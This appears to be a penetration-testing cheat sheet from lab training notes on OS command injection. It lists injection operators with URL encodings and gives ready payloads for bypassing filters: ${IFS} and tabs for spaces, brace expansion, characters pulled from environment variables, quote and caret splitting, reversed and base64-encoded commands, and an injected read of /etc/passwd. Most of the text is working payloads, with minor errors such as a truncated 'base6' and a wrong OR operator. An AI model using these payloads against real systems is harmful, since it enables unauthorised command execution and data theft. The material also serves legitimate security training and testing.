## Command Injection Methods

To inject an additional command to the intended one, we may use any of the following operators:

| **Injection Operator** | **Injection Character** | **URL-Encoded Character** | **Executed Command**                       |
| ---------------------- | ----------------------- | ------------------------- | ------------------------------------------ |
| Semicolon              | `;`                     | `%3b`                     | Both                                       |
| New Line               | `\n`                    | `%0a`                     | Both                                       |
| Background             | `&`                     | `%26`                     | Both (second output generally shown first) |
| Pipe                   | `\|`                    | `%7c`                     | Both (only second output is shown)         |
| AND                    | `&&`                    | `%26%26`                  | Both (only if first succeeds)              |
| OR                     | `\|`                    | `%7c%7c`                  | Second (only if first fails)               |
| Sub-Shell              | ` `` `                  | `%60%60`                  | Both (Linux-only)                          |
| Sub-Shell              | `$()`                   | `%24%28%29`               | Both (Linux-only)                          |

#### IF the DOM - FrontEnd is preventing us from setting the payload, use BurpSuite

| **Injection Type**                      | **Operators**                                     |
| --------------------------------------- | ------------------------------------------------- |
| SQL Injection                           | `'` `,` `;` `--` `/* */`                          |
| Command Injection                       | `;` `&&`                                          |
| LDAP Injection                          | `*` `(` `)` `&` `\|`                              |
| XPath Injection                         | `'` `or` `and` `not` `substring` `concat` `count` |
| OS Command Injection                    | `;` `&` `\|`                                      |
| Code Injection                          | `'` `;` `--` `/* */` `$()` `${}` `#{}` `%{}` `^`  |
| Directory Traversal/File Path Traversal | `../` `..\\` `%00`                                |
| Object Injection                        | `;` `&` `\|`                                      |
| XQuery Injection                        | `'` `;` `--` `/* */`                              |
| Shellcode Injection                     | `\x` `\u` `%u` `%n`                               |
| Header Injection                        | `\n` `\r\n` `\t` `%0d` `%0a` `%09`                |

#### If we get "invalid input" may be because of blacklisted characters. We must try all of them.

#### If we get the proper output with not the payload means that has not been blacklisted.

## IF Space is blacklisted use Tabs = %09
## Or using ${IFS} which commonly has as a default an space or tab.

#### Using Brace Expansion
```shell-session
$ {ls,-la}
```

Example payload to exeute ls -la:
```
127.0.0.1%0a{ls,-la}
```

(not adding echo) -> obtain /
```shell-session
$ echo ${PATH:0:1}

/
```
```shell-session
$ echo ${LS_COLORS:10:1}

;
```

```shell-session
127.0.0.1${LS_COLORS:10:1}${IFS}
```

```cmd-session
C:\htb> echo %HOMEPATH:~6,-11%

\
```
```powershell-session
$env:HOMEPATH[0]

\
```

```shell-session
$ man ascii     # \ is on 92, before it is [ on 91
$ echo $(tr '!-}' '"-~'<<<[)

\
```

ls -la /
```
%0a{ls,-la,${PATH:0:1},${IFS}home}
```

ls -la /home
```
ip=127.0.0.1%0a{ls,-la,${PATH:0:1}home}
```

## Commands Blacklist Bypass
Windows and Linux:
```shell-session
$ w'h'o'am'i
```
```shell-session
$ w"h"o"am"i
```

Linux Only:
```bash
who$@ami
```

Windows Only:
```cmd-session
C:\htb> who^ami
```

```
ip=127.0.0.1%0abash<<<$(base64%09-d<<<ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE=)
```

## Advanced Command Obfuscation
```powershell-session
PS C:\htb> WhOaMi
```
```shell-session
$ $(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
```
```bash
$(a="WhOaMi";printf %s "${a,,}")
```

```shell-session
$ echo 'whoami' | rev
```
```shell-session
$ $(rev<<<'imaohw')
```

```powershell-session
PS C:\htb> "whoami"[-1..-20] -join ''

```powershell-session
PS C:\htb> iex "$('imaohw'[-1..-20] -join '')"
```

```shell-session
$ echo -n 'cat /etc/passwd | grep 33' | base64
```
```shell-session
$ bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```

```powershell-session
PS C:\htb> [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
```

```shell-session
$ echo -n whoami | iconv -f utf-8 -t utf-16le | base6
```

```powershell-session
PS C:\htb> iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
```